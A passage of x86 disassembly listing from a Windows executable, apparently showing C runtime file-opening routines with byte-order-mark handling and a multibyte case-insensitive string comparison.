                mov     dword ptr [eax], 18h
                jmp     loc_41A120
; ---------------------------------------------------------------------------

loc_41A092:                             ; CODE XREF: sub_419E86+1F0↑j
                mov     eax, [ebp+arg_0]
                mov     edi, ds:CreateFileA
                push    ebx             ; hTemplateFile
                push    [ebp+dwFlagsAndAttributes] ; dwFlagsAndAttributes
                mov     dword ptr [eax], 1
                push    [ebp+dwCreationDisposition] ; dwCreationDisposition
                lea     eax, [ebp+SecurityAttributes]
                push    eax             ; lpSecurityAttributes
                push    [ebp+dwShareMode] ; dwShareMode
                push    [ebp+dwDesiredAccess] ; dwDesiredAccess
                push    [ebp+lpFileName] ; lpFileName
                call    edi ; CreateFileA
                mov     [ebp+hFile], eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41A12C
                mov     ecx, [ebp+dwDesiredAccess]
                mov     eax, 0C0000000h
                and     ecx, eax
                cmp     ecx, eax
                jnz     short loc_41A0F8
                test    byte ptr [ebp+arg_8], 1
                jz      short loc_41A0F8
                and     [ebp+dwDesiredAccess], 7FFFFFFFh
                push    ebx             ; hTemplateFile
                push    [ebp+dwFlagsAndAttributes] ; dwFlagsAndAttributes
                lea     eax, [ebp+SecurityAttributes]
                push    [ebp+dwCreationDisposition] ; dwCreationDisposition
                push    eax             ; lpSecurityAttributes
                push    [ebp+dwShareMode] ; dwShareMode
                push    [ebp+dwDesiredAccess] ; dwDesiredAccess
                push    [ebp+lpFileName] ; lpFileName
                call    edi ; CreateFileA
                mov     [ebp+hFile], eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41A12C

loc_41A0F8:                             ; CODE XREF: sub_419E86+245↑j
                                        ; sub_419E86+24B↑j
                mov     esi, [esi]
                mov     eax, esi
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                and     esi, 1Fh
                shl     esi, 6
                lea     eax, [eax+esi+4]
                and     byte ptr [eax], 0FEh
                call    ds:GetLastError
                push    eax
                call    sub_410934

loc_41A11F:                             ; CODE XREF: sub_419E86+39A↓j
                                        ; sub_419E86+6FC↓j
                pop     ecx

loc_41A120:                             ; CODE XREF: sub_419E86+207↑j
                                        ; sub_419E86+2E8↓j ...
                call    sub_41090E
                mov     eax, [eax]
                jmp     loc_41A5A0
; ---------------------------------------------------------------------------

loc_41A12C:                             ; CODE XREF: sub_419E86+237↑j
                                        ; sub_419E86+270↑j
                push    [ebp+hFile]     ; hFile
                call    ds:GetFileType
                cmp     eax, ebx
                jnz     short loc_41A17D
                mov     esi, [esi]
                mov     eax, esi
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                and     esi, 1Fh
                shl     esi, 6
                lea     eax, [eax+esi+4]
                and     byte ptr [eax], 0FEh
                call    ds:GetLastError
                mov     esi, eax
                push    esi
                call    sub_410934
                pop     ecx
                push    [ebp+hFile]     ; hObject
                call    ds:CloseHandle
                cmp     esi, ebx
                jnz     short loc_41A120
                call    sub_41090E
                mov     dword ptr [eax], 0Dh
                jmp     short loc_41A120
; ---------------------------------------------------------------------------

loc_41A17D:                             ; CODE XREF: sub_419E86+2B1↑j
                cmp     eax, 2
                jnz     short loc_41A188
                or      [ebp+var_1], 40h
                jmp     short loc_41A191
; ---------------------------------------------------------------------------

loc_41A188:                             ; CODE XREF: sub_419E86+2FA↑j
                cmp     eax, 3
                jnz     short loc_41A191
                or      [ebp+var_1], 8

loc_41A191:                             ; CODE XREF: sub_419E86+300↑j
                                        ; sub_419E86+305↑j
                push    [ebp+hFile]     ; hHandle
                push    dword ptr [esi] ; int
                call    sub_41615F
                mov     eax, [esi]
                mov     edx, eax
                and     eax, 1Fh
                sar     edx, 5
                mov     edx, dword_42CA00[edx*4]
                pop     ecx
                shl     eax, 6
                pop     ecx
                mov     cl, [ebp+var_1]
                or      cl, 1
                mov     [edx+eax+4], cl
                mov     eax, [esi]
                mov     edx, eax
                and     eax, 1Fh
                sar     edx, 5
                mov     edx, dword_42CA00[edx*4]
                shl     eax, 6
                lea     eax, [edx+eax+24h]
                and     byte ptr [eax], 80h
                mov     [ebp+var_3], cl
                and     [ebp+var_3], 48h
                mov     [ebp+var_1], cl
                jnz     loc_41A266
                test    cl, 80h
                jz      loc_41A4A0
                test    byte ptr [ebp+arg_8], 2
                jz      short loc_41A266
                push    2               ; dwMoveMethod
                or      edi, 0FFFFFFFFh
                push    edi             ; lDistanceToMove
                push    dword ptr [esi] ; int
                call    sub_4154AB
                add     esp, 0Ch
                mov     [ebp+var_18], eax
                cmp     eax, edi
                jnz     short loc_41A225
                call    sub_410921
                cmp     dword ptr [eax], 83h
                jz      short loc_41A266

loc_41A219:                             ; CODE XREF: sub_419E86+3CE↓j
                                        ; sub_419E86+3DE↓j ...
                push    dword ptr [esi]
                call    sub_415F18
                jmp     loc_41A11F
; ---------------------------------------------------------------------------

loc_41A225:                             ; CODE XREF: sub_419E86+384↑j
                push    1               ; nNumberOfBytesToRead
                lea     eax, [ebp+Buffer]
                push    eax             ; lpBuffer
                push    dword ptr [esi] ; int
                mov     [ebp+Buffer], bl
                call    sub_413E86
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_41A256
                cmp     [ebp+Buffer], 1Ah
                jnz     short loc_41A256
                mov     eax, [ebp+var_18]
                cdq
                push    edx
                push    eax
                push    dword ptr [esi]
                call    sub_41CC6C
                add     esp, 0Ch
                cmp     eax, edi
                jz      short loc_41A219

loc_41A256:                             ; CODE XREF: sub_419E86+3B4↑j
                                        ; sub_419E86+3BA↑j
                push    ebx             ; dwMoveMethod
                push    ebx             ; lDistanceToMove
                push    dword ptr [esi] ; int
                call    sub_4154AB
                add     esp, 0Ch
                cmp     eax, edi
                jz      short loc_41A219

loc_41A266:                             ; CODE XREF: sub_419E86+35A↑j
                                        ; sub_419E86+36D↑j ...
                test    [ebp+var_1], 80h
                jz      loc_41A4A0
                mov     edi, 74000h
                mov     ecx, 4000h
                test    [ebp+arg_8], edi
                jnz     short loc_41A28E
                mov     eax, [ebp+var_20]
                and     eax, edi
                jnz     short loc_41A28B
                or      [ebp+arg_8], ecx
                jmp     short loc_41A28E
; ---------------------------------------------------------------------------

loc_41A28B:                             ; CODE XREF: sub_419E86+3FE↑j
                or      [ebp+arg_8], eax

loc_41A28E:                             ; CODE XREF: sub_419E86+3F7↑j
                                        ; sub_419E86+403↑j
                mov     eax, [ebp+arg_8]
                and     eax, edi
                cmp     eax, ecx
                jz      short loc_41A2DB
                cmp     eax, 10000h
                jz      short loc_41A2C7
                cmp     eax, 14000h
                jz      short loc_41A2C7
                cmp     eax, 20000h
                jz      short loc_41A2D5
                cmp     eax, 24000h
                jz      short loc_41A2D5
                cmp     eax, 40000h
                jz      short loc_41A2C1
                cmp     eax, 44000h
                jnz     short loc_41A2DE

loc_41A2C1:                             ; CODE XREF: sub_419E86+432↑j
                mov     [ebp+var_2], 1
                jmp     short loc_41A2DE
; ---------------------------------------------------------------------------

loc_41A2C7:                             ; CODE XREF: sub_419E86+416↑j
                                        ; sub_419E86+41D↑j
                mov     ecx, [ebp+arg_8]
                mov     eax, 301h
                and     ecx, eax
                cmp     ecx, eax
                jnz     short loc_41A2DE

loc_41A2D5:                             ; CODE XREF: sub_419E86+424↑j
                                        ; sub_419E86+42B↑j
                mov     [ebp+var_2], 2
                jmp     short loc_41A2DE
; ---------------------------------------------------------------------------

loc_41A2DB:                             ; CODE XREF: sub_419E86+40F↑j
                mov     [ebp+var_2], bl

loc_41A2DE:                             ; CODE XREF: sub_419E86+439↑j
                                        ; sub_419E86+43F↑j ...
                test    [ebp+arg_8], 70000h
                jz      loc_41A4A0
                test    [ebp+var_1], 40h
                mov     [ebp+var_18], ebx
                jnz     loc_41A4A0
                mov     eax, [ebp+dwDesiredAccess]
                mov     ecx, 0C0000000h
                and     eax, ecx
                cmp     eax, 40000000h
                jz      loc_41A3C4
                cmp     eax, 80000000h
                jz      short loc_41A38B
                cmp     eax, ecx
                jnz     loc_41A4A0
                mov     eax, [ebp+dwCreationDisposition]
                cmp     eax, ebx
                jbe     loc_41A4A0
                cmp     eax, 2
                jbe     short loc_41A33A
                cmp     eax, 4
                jbe     short loc_41A361

loc_41A331:                             ; CODE XREF: sub_419E86+555↓j
                cmp     eax, 5
                jnz     loc_41A4A0

loc_41A33A:                             ; CODE XREF: sub_419E86+4A4↑j
                                        ; sub_419E86+4EB↓j ...
                movsx   eax, [ebp+var_2]
                xor     edi, edi
                dec     eax
                jz      loc_41A46D
                dec     eax
                jnz     loc_41A4A0
                mov     [ebp+var_18], 0FEFFh
                mov     [ebp+dwCreationDisposition], 2
                jmp     loc_41A47B
; ---------------------------------------------------------------------------

loc_41A361:                             ; CODE XREF: sub_419E86+4A9↑j
                push    2               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    dword ptr [esi] ; int
                call    sub_41892C
                add     esp, 10h
                or      eax, edx
                jz      short loc_41A33A
                push    ebx             ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    dword ptr [esi] ; int
                call    sub_41892C
                and     eax, edx
                add     esp, 10h
                cmp     eax, 0FFFFFFFFh
                jz      loc_41A219

loc_41A38B:                             ; CODE XREF: sub_419E86+48C↑j
                push    3               ; nNumberOfBytesToRead
                lea     eax, [ebp+var_18]
                push    eax             ; lpBuffer
                push    dword ptr [esi] ; int
                call    sub_413E86
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      loc_41A219
                cmp     eax, 2
                jz      short loc_41A414
                cmp     eax, 3
                jnz     loc_41A45F
                cmp     [ebp+var_18], 0BFBBEFh
                jnz     short loc_41A414
                mov     [ebp+var_2], 1
                jmp     loc_41A4A0
; ---------------------------------------------------------------------------

loc_41A3C4:                             ; CODE XREF: sub_419E86+481↑j
                mov     eax, [ebp+dwCreationDisposition]
                cmp     eax, ebx
                jbe     loc_41A4A0
                cmp     eax, 2
                jbe     loc_41A33A
                cmp     eax, 4
                ja      loc_41A331
                push    2               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    dword ptr [esi] ; int
                call    sub_41892C
                add     esp, 10h
                or      eax, edx
                jz      loc_41A33A
                push    ebx             ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    dword ptr [esi] ; int
                call    sub_41892C
                add     esp, 10h
                and     eax, edx

loc_41A406:                             ; CODE XREF: sub_419E86+5E5↓j
                cmp     eax, 0FFFFFFFFh
                jnz     loc_41A4A0
                jmp     loc_41A219
; ---------------------------------------------------------------------------

loc_41A414:                             ; CODE XREF: sub_419E86+521↑j
                                        ; sub_419E86+533↑j
                mov     eax, [ebp+var_18]
                and     eax, 0FFFFh
                cmp     eax, 0FFFEh
                jnz     short loc_41A43C
                push    dword ptr [esi]
                call    sub_415F18
                pop     ecx
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_41A435:                             ; CODE XREF: sub_419E86+AA↑j
                mov     eax, esi
                jmp     loc_41A5A0
; ---------------------------------------------------------------------------

loc_41A43C:                             ; CODE XREF: sub_419E86+59B↑j
                cmp     eax, 0FEFFh
                jnz     short loc_41A45F
                push    ebx             ; dwMoveMethod
                push    2               ; lDistanceToMove
                push    dword ptr [esi] ; int
                call    sub_4154AB
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      loc_41A219
                mov     [ebp+var_2], 2
                jmp     short loc_41A4A0
; ---------------------------------------------------------------------------

loc_41A45F:                             ; CODE XREF: sub_419E86+526↑j
                                        ; sub_419E86+5BB↑j
                push    ebx             ; dwMoveMethod
                push    ebx             ; lDistanceToMove
                push    dword ptr [esi] ; int
                call    sub_4154AB
                add     esp, 0Ch
                jmp     short loc_41A406
; ---------------------------------------------------------------------------

loc_41A46D:                             ; CODE XREF: sub_419E86+4BB↑j
                mov     [ebp+var_18], 0BFBBEFh
                mov     [ebp+dwCreationDisposition], 3

loc_41A47B:                             ; CODE XREF: sub_419E86+4D6↑j
                                        ; sub_419E86+618↓j
                mov     eax, [ebp+dwCreationDisposition]
                sub     eax, edi
                push    eax             ; nNumberOfBytesToWrite
                lea     eax, [ebp+edi+var_18]
                push    eax             ; int
                push    dword ptr [esi] ; int
                call    sub_414FE8
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      loc_41A219
                add     edi, eax
                cmp     [ebp+dwCreationDisposition], edi
                jg      short loc_41A47B

loc_41A4A0:                             ; CODE XREF: sub_419E86+363↑j
                                        ; sub_419E86+3E4↑j ...
                mov     eax, [esi]
                mov     ecx, eax
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                and     eax, 1Fh
                shl     eax, 6
                lea     eax, [ecx+eax+24h]
                mov     cl, [eax]
                xor     cl, [ebp+var_2]
                and     cl, 7Fh
                xor     [eax], cl
                mov     eax, [esi]
                mov     ecx, eax
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                and     eax, 1Fh
                shl     eax, 6
                lea     eax, [ecx+eax+24h]
                mov     ecx, [ebp+arg_8]
                mov     dl, [eax]
                shr     ecx, 10h
                shl     cl, 7
                and     dl, 7Fh
                or      cl, dl
                mov     [eax], cl
                cmp     [ebp+var_3], bl
                jnz     short loc_41A512
                test    byte ptr [ebp+arg_8], 8
                jz      short loc_41A512
                mov     eax, [esi]
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                shl     eax, 6
                lea     eax, [ecx+eax+4]
                or      byte ptr [eax], 20h

loc_41A512:                             ; CODE XREF: sub_419E86+669↑j
                                        ; sub_419E86+66F↑j
                mov     edi, [ebp+dwDesiredAccess]
                mov     eax, 0C0000000h
                mov     ecx, edi
                and     ecx, eax
                cmp     ecx, eax
                jnz     short loc_41A59E
                test    byte ptr [ebp+arg_8], 1
                jz      short loc_41A59E
                push    [ebp+hFile]     ; hObject
                call    ds:CloseHandle
                push    ebx             ; hTemplateFile
                push    [ebp+dwFlagsAndAttributes] ; dwFlagsAndAttributes
                lea     eax, [ebp+SecurityAttributes]
                push    3               ; dwCreationDisposition
                push    eax             ; lpSecurityAttributes
                push    [ebp+dwShareMode] ; dwShareMode
                and     edi, 7FFFFFFFh
                push    edi             ; dwDesiredAccess
                push    [ebp+lpFileName] ; lpFileName
                call    ds:CreateFileA
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41A587
                call    ds:GetLastError
                push    eax
                call    sub_410934
                mov     eax, [esi]
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                shl     eax, 6
                lea     eax, [ecx+eax+4]
                and     byte ptr [eax], 0FEh
                push    dword ptr [esi]
                call    sub_4161E0
                pop     ecx
                jmp     loc_41A11F
; ---------------------------------------------------------------------------

loc_41A587:                             ; CODE XREF: sub_419E86+6CB↑j
                mov     esi, [esi]
                mov     ecx, esi
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                and     esi, 1Fh
                shl     esi, 6
                mov     [esi+ecx], eax

loc_41A59E:                             ; CODE XREF: sub_419E86+69A↑j
                                        ; sub_419E86+6A0↑j
                mov     eax, ebx

loc_41A5A0:                             ; CODE XREF: sub_419E86+2A1↑j
                                        ; sub_419E86+5B1↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_419E86      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41A5A5(LPCSTR lpFileName, int, int, int, int, int)
sub_41A5A5      proc near               ; CODE XREF: sub_41A671+16↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
lpFileName      = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                push    14h
                push    offset stru_423248
                call    __SEH_prolog4
                xor     esi, esi
                mov     [ebp+var_1C], esi
                xor     eax, eax
                mov     edi, [ebp+arg_10]
                cmp     edi, esi
                setnz   al
                cmp     eax, esi
                jnz     short loc_41A5DF

loc_41A5C4:                             ; CODE XREF: sub_41A5A5+47↓j
                                        ; sub_41A5A5+5B↓j
                call    sub_41090E
                push    16h
                pop     edi
                mov     [eax], edi
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, edi
                jmp     short loc_41A638
; ---------------------------------------------------------------------------

loc_41A5DF:                             ; CODE XREF: sub_41A5A5+1D↑j
                or      dword ptr [edi], 0FFFFFFFFh
                xor     eax, eax
                cmp     [ebp+lpFileName], esi
                setnz   al
                cmp     eax, esi
                jz      short loc_41A5C4
                cmp     [ebp+arg_14], esi
                jz      short loc_41A602
                mov     eax, [ebp+arg_C]
                and     eax, 0FFFFFE7Fh
                neg     eax
                sbb     eax, eax
                inc     eax
                jz      short loc_41A5C4

loc_41A602:                             ; CODE XREF: sub_41A5A5+4C↑j
                mov     [ebp+ms_exc.registration.TryLevel], esi
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+arg_4]     ; int
                push    [ebp+lpFileName] ; lpFileName
                lea     eax, [ebp+var_1C]
                push    eax             ; int
                mov     eax, edi
                call    sub_419E86
                add     esp, 14h
                mov     [ebp+var_20], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_41A643
; ---------------------------------------------------------------------------

loc_41A62E:                             ; CODE XREF: sub_41A5A5:loc_41A670↓j
                mov     eax, [ebp+var_20]
                cmp     eax, esi
                jz      short loc_41A638
                or      dword ptr [edi], 0FFFFFFFFh

loc_41A638:                             ; CODE XREF: sub_41A5A5+38↑j
                                        ; sub_41A5A5+8E↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41A63E:                             ; DATA XREF: .rdata:stru_423248↓o
                xor     esi, esi
                mov     edi, [ebp+arg_10]

loc_41A643:                             ; CODE XREF: sub_41A5A5+84↑j
                cmp     [ebp+var_1C], esi
                jz      short loc_41A670
                cmp     [ebp+var_20], esi
                jz      short loc_41A668
                mov     eax, [edi]
                mov     ecx, eax
                sar     ecx, 5
                and     eax, 1Fh
                shl     eax, 6
                mov     ecx, dword_42CA00[ecx*4]
                lea     eax, [ecx+eax+4]
                and     byte ptr [eax], 0FEh

loc_41A668:                             ; CODE XREF: sub_41A5A5+A6↑j
                push    dword ptr [edi]
                call    sub_41637D
                pop     ecx

loc_41A670:                             ; CODE XREF: sub_41A5A5+A1↑j
                retn
sub_41A5A5      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41A671(int, LPCSTR lpFileName, int, int, int)
sub_41A671      proc near               ; CODE XREF: sub_41374F+294↑p

arg_0           = dword ptr  8
lpFileName      = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    1               ; int
                push    [ebp+arg_0]     ; int
                push    [ebp+arg_10]    ; int
                push    [ebp+arg_C]     ; int
                push    [ebp+arg_8]     ; int
                push    [ebp+lpFileName] ; lpFileName
                call    sub_41A5A5
                add     esp, 18h
                pop     ebp
                retn
sub_41A671      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41A691      proc near               ; CODE XREF: sub_41A8BC+10↓p

var_18          = byte ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = byte ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    ebx
                push    [ebp+arg_C]
                lea     ecx, [ebp+var_18]
                call    sub_40E461
                xor     ebx, ebx
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41A6BF
                cmp     [ebp+var_C], bl
                jz      short loc_41A6B8
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A6B8:                             ; CODE XREF: sub_41A691+1E↑j
                xor     eax, eax
                jmp     loc_41A8A5
; ---------------------------------------------------------------------------

loc_41A6BF:                             ; CODE XREF: sub_41A691+19↑j
                mov     eax, [ebp+var_14]
                cmp     [eax+8], ebx
                jnz     short loc_41A6ED
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40E5DA
                add     esp, 0Ch
                cmp     [ebp+var_C], bl
                jz      loc_41A8A5
                mov     ecx, [ebp+var_10]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     loc_41A8A5
; ---------------------------------------------------------------------------

loc_41A6ED:                             ; CODE XREF: sub_41A691+34↑j
                cmp     [ebp+arg_0], ebx
                jnz     short loc_41A720
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_C], bl
                jz      short loc_41A716
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A716:                             ; CODE XREF: sub_41A691+7C↑j
                mov     eax, 7FFFFFFFh
                jmp     loc_41A8A5
; ---------------------------------------------------------------------------

loc_41A720:                             ; CODE XREF: sub_41A691+5F↑j
                push    edi
                mov     edi, [ebp+arg_4]
                cmp     edi, ebx
                jnz     short loc_41A756
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_C], bl
                jz      short loc_41A74C
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A74C:                             ; CODE XREF: sub_41A691+B2↑j
                mov     eax, 7FFFFFFFh
                jmp     loc_41A8A4
; ---------------------------------------------------------------------------

loc_41A756:                             ; CODE XREF: sub_41A691+95↑j
                push    esi

loc_41A757:                             ; CODE XREF: sub_41A691+1FE↓j
                mov     ecx, [ebp+arg_0]
                movzx   cx, byte ptr [ecx]
                dec     [ebp+arg_8]
                inc     [ebp+arg_0]
                movzx   ecx, cx
                movzx   edx, cl
                test    byte ptr [edx+eax+1Dh], 4
                mov     [ebp+var_8], ecx
                jz      short loc_41A7DD
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41A795
                movzx   ecx, byte ptr [edi]
                test    byte ptr [ecx+eax+1Dh], 4
                mov     [ebp+var_8], ebx
                jnz     loc_41A895
                movzx   ecx, cx
                mov     si, bx
                jmp     loc_41A87B
; ---------------------------------------------------------------------------

loc_41A795:                             ; CODE XREF: sub_41A691+E6↑j
                mov     edx, [ebp+arg_0]
                mov     dl, [edx]
                cmp     dl, bl
                jnz     short loc_41A7A3
                mov     [ebp+var_8], ebx
                jmp     short loc_41A7FD
; ---------------------------------------------------------------------------

loc_41A7A3:                             ; CODE XREF: sub_41A691+10B↑j
                shl     ecx, 8
                movzx   dx, dl
                or      cx, dx
                inc     [ebp+arg_0]
                movzx   ecx, cx
                mov     si, cx
                mov     [ebp+var_8], ecx
                cmp     si, [eax+10h]
                jb      short loc_41A7CB
                cmp     si, [eax+12h]
                ja      short loc_41A7CB
                add     si, [eax+14h]
                jmp     short loc_41A801
; ---------------------------------------------------------------------------

loc_41A7CB:                             ; CODE XREF: sub_41A691+12C↑j
                                        ; sub_41A691+132↑j
                cmp     si, [eax+16h]
                jb      short loc_41A801
                cmp     si, [eax+18h]
                ja      short loc_41A801
                add     si, [eax+1Ah]
                jmp     short loc_41A801
; ---------------------------------------------------------------------------

loc_41A7DD:                             ; CODE XREF: sub_41A691+E1↑j
                movzx   edx, word ptr [ebp+var_8]
                lea     ecx, [edx+eax]
                test    byte ptr [ecx+1Dh], 10h
                jz      short loc_41A7F7
                movzx   cx, byte ptr [ecx+11Dh]
                movzx   ecx, cx
                jmp     short loc_41A7FA
; ---------------------------------------------------------------------------

loc_41A7F7:                             ; CODE XREF: sub_41A691+157↑j
                movzx   ecx, dx

loc_41A7FA:                             ; CODE XREF: sub_41A691+164↑j
                mov     [ebp+var_8], ecx

loc_41A7FD:                             ; CODE XREF: sub_41A691+110↑j
                mov     si, word ptr [ebp+var_8]

loc_41A801:                             ; CODE XREF: sub_41A691+138↑j
                                        ; sub_41A691+13E↑j ...
                movzx   cx, byte ptr [edi]
                movzx   ecx, cx
                movzx   edx, cl
                inc     edi
                test    byte ptr [edx+eax+1Dh], 4
                mov     [ebp+var_4], ecx
                jz      short loc_41A85E
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41A820

loc_41A81B:                             ; CODE XREF: sub_41A691+196↓j
                mov     [ebp+var_4], ebx
                jmp     short loc_41A87E
; ---------------------------------------------------------------------------

loc_41A820:                             ; CODE XREF: sub_41A691+188↑j
                mov     dl, [edi]
                dec     [ebp+arg_8]
                cmp     dl, bl
                jz      short loc_41A81B
                shl     ecx, 8
                movzx   dx, dl
                or      cx, dx
                movzx   ecx, cx
                inc     edi
                mov     [ebp+var_4], ecx
                cmp     cx, [eax+10h]
                jb      short loc_41A84C
                cmp     cx, [eax+12h]
                ja      short loc_41A84C
                add     cx, [eax+14h]
                jmp     short loc_41A882
; ---------------------------------------------------------------------------

loc_41A84C:                             ; CODE XREF: sub_41A691+1AD↑j
                                        ; sub_41A691+1B3↑j
                cmp     cx, [eax+16h]
                jb      short loc_41A882
                cmp     cx, [eax+18h]
                ja      short loc_41A882
                add     cx, [eax+1Ah]
                jmp     short loc_41A882
; ---------------------------------------------------------------------------

loc_41A85E:                             ; CODE XREF: sub_41A691+183↑j
                movzx   edx, word ptr [ebp+var_4]
                lea     ecx, [edx+eax]
                test    byte ptr [ecx+1Dh], 10h
                jz      short loc_41A878
                movzx   cx, byte ptr [ecx+11Dh]
                movzx   ecx, cx
                jmp     short loc_41A87B
; ---------------------------------------------------------------------------

loc_41A878:                             ; CODE XREF: sub_41A691+1D8↑j
                movzx   ecx, dx

loc_41A87B:                             ; CODE XREF: sub_41A691+FF↑j
                                        ; sub_41A691+1E5↑j
                mov     [ebp+var_4], ecx

loc_41A87E:                             ; CODE XREF: sub_41A691+18D↑j
                mov     cx, word ptr [ebp+var_4]

loc_41A882:                             ; CODE XREF: sub_41A691+1B9↑j
                                        ; sub_41A691+1BF↑j ...
                cmp     cx, si
                jnz     short loc_41A8A8
                cmp     si, bx
                jz      short loc_41A895
                cmp     [ebp+arg_8], ebx
                jnz     loc_41A757

loc_41A895:                             ; CODE XREF: sub_41A691+F3↑j
                                        ; sub_41A691+1F9↑j
                cmp     [ebp+var_C], bl
                jz      short loc_41A8A1
                mov     eax, [ebp+var_10]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A8A1:                             ; CODE XREF: sub_41A691+207↑j
                xor     eax, eax

loc_41A8A3:                             ; CODE XREF: sub_41A691+220↓j
                                        ; sub_41A691+229↓j
                pop     esi

loc_41A8A4:                             ; CODE XREF: sub_41A691+C0↑j
                pop     edi

loc_41A8A5:                             ; CODE XREF: sub_41A691+29↑j
                                        ; sub_41A691+4A↑j ...
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_41A8A8:                             ; CODE XREF: sub_41A691+1F4↑j
                sbb     eax, eax
                and     eax, 2
                dec     eax
                cmp     [ebp+var_C], bl
                jz      short loc_41A8A3
                mov     ecx, [ebp+var_10]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     short loc_41A8A3
sub_41A691      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41A8BC      proc near               ; CODE XREF: sub_41374F+206↑p
                                        ; sub_41374F+226↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41A691
                add     esp, 10h
                pop     ebp
                retn
sub_41A8BC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41A8D6      proc near               ; CODE XREF: sub_41AA40+10↓p

var_10          = byte ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                xor     ebx, ebx
                cmp     [ebp+arg_8], ebx
                jnz     short loc_41A8ED
                xor     eax, eax
                jmp     loc_41A9C5
; ---------------------------------------------------------------------------

loc_41A8ED:                             ; CODE XREF: sub_41A8D6+E↑j
                push    edi
                push    [ebp+arg_C]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     edi, [ebp+var_C]
                cmp     [edi+8], ebx
                jnz     short loc_41A927
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41980B
                add     esp, 0Ch
                cmp     [ebp+var_4], bl
                jz      loc_41A9C4
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     loc_41A9C4
; ---------------------------------------------------------------------------

loc_41A927:                             ; CODE XREF: sub_41A8D6+29↑j
                cmp     [ebp+arg_0], ebx
                jnz     short loc_41A957
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      short loc_41A950
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41A950:                             ; CODE XREF: sub_41A8D6+71↑j
                mov     eax, 7FFFFFFFh
                jmp     short loc_41A9C4
